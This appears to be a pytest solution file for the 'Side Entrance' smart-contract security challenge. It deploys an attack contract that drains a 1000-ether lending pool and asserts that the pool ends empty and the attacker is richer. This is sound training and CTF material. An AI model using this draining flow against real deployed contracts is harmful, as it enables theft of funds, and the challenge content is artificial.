import pytest
from brownie import accounts, SideEntranceLenderPool, SideEntranceAttack

@pytest.fixture(scope='module')
def deployer(accounts):
    return accounts[0]

@pytest.fixture(scope='module')
def attacker(accounts):
    return accounts[1]

@pytest.fixture(scope='module')
def pool(deployer):
    return SideEntranceLenderPool.deploy({'from': deployer})


@pytest.fixture(scope='module',autouse=True)
def setup(pool,deployer): 
    ''' [Challenge] side entrance '''

    ETHER_IN_POOL = 1000e18
    
    # SETUP SCENARIO
    pool.deposit({'from':deployer, 'value':ETHER_IN_POOL})

    assert pool.balance() == ETHER_IN_POOL


def test_exploit(pool,attacker):
    #/** YOUR EXPLOIT GOES HERE */
    sideEntraceAttack = SideEntranceAttack.deploy(pool.address,{'from': attacker})
    sideEntraceAttack.attack({'from':attacker})
    sideEntraceAttack.withdraw({'from':attacker})
    assert sideEntraceAttack.balance() == 10e18
    sideEntraceAttack.destroy({'from':attacker})

def test_success(pool,attacker):

    assert pool.balance() == 0
    
    # Not checking exactly how much is the final balance of the attacker,
    # because it'll depend on how much gas the attacker spends in the attack
    # If there were no gas costs, it would be balance before attack + ETHER_IN_POOL

    assert attacker.balance() > 11000e18

       

